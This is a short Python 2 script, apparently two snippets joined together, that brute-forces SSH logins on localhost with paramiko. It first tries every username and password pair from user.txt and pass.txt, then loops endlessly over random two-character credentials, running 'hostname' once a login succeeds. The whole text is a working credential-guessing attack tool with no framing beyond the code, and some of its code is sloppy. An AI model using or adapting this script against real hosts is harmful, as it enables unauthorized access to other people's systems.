import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open('user.txt','r') as u:
        for line in u:
                usrnm=line
                usrnm.rstrip('\n')
                print line
                print usrnm
                with open('pass.txt','r') as p:
                        for line in p:
                                psswrd=line
                                psswrd.rstrip('\n')
                                print line
                                print psswrd
                                try:
                                        print p
                                        print usrnm
                                        ssh.connect('localhost', username=usrnm.rstrip('\n'), password=psswrd.rstrip('\n'))
                                except paramiko.SSHException:
                                        print "Connection Failed"
                                        continue
                                stdin,stdout,stderr = ssh.exec_command("hostname")

                                for line in stdout.readlines():
                                        print line.strip()
                                        ssh.close()
import random

s = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()?"
passlen = 2
p =  "".join(random.sample(s,passlen ))
print p
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
while 1:
    try:
        s = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()?"
        passlen = 2
        p =  "".join(random.sample(s,passlen ))
        print p
        ssh.connect('localhost', username=p, password=p)
    except paramiko.SSHException:
        print "Connection Failed"
        continue
    stdin,stdout,stderr = ssh.exec_command("hostname")
    for line in stdout.readlines():
        print line.strip()
        ssh.close()
        break
